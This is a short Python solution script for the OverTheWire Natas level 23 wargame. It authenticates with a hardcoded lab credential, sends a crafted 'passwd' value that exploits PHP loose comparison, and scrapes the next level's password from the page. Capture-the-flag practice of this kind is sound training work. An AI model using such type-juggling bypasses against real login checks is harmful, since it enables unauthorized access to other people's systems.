import re, requests
USER = 'natas23'
PASS = 'dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs'
URL = f'http://{USER}.natas.labs.overthewire.org/'
AUTH_BASIC = requests.auth.HTTPBasicAuth(USER, PASS)
payload = '?passwd=11iloveyou'

request = requests.get(url=URL + payload, auth=AUTH_BASIC)
response_http = request.text
flag = re.findall(r'(Password:[^:]+/pre)', response_http)
print('The password for the natas24 is:',flag[0][10: -5])